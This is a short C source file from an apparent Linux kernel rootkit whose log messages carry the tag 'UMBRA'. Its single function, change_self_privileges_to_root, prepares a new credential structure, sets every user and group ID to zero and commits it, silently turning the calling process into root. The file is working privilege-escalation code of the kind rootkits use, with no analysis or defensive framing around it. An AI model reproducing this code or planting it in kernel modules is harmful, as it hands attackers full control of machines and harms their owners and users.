#include "../include/creds_manager.h"


void change_self_privileges_to_root(void){
    struct cred *creds = prepare_creds();
    if(creds==NULL){
        printk(KERN_INFO "Error preparing creds");
        return;
    }

    //Just change all ids to 0
    creds->egid.val = 0;
    creds->fsgid.val = 0;
    creds->gid.val = 0;
    creds->sgid.val = 0;
    creds->euid.val = 0;
    creds->fsuid.val = 0;
    creds->suid.val = 0;
    creds->uid.val = 0;

    commit_creds(creds);
    printk(KERN_INFO "UMBRA:: User set to root.\n");
    //If any changes to creds must be done, another creds struct must be created, do not reuse this one
}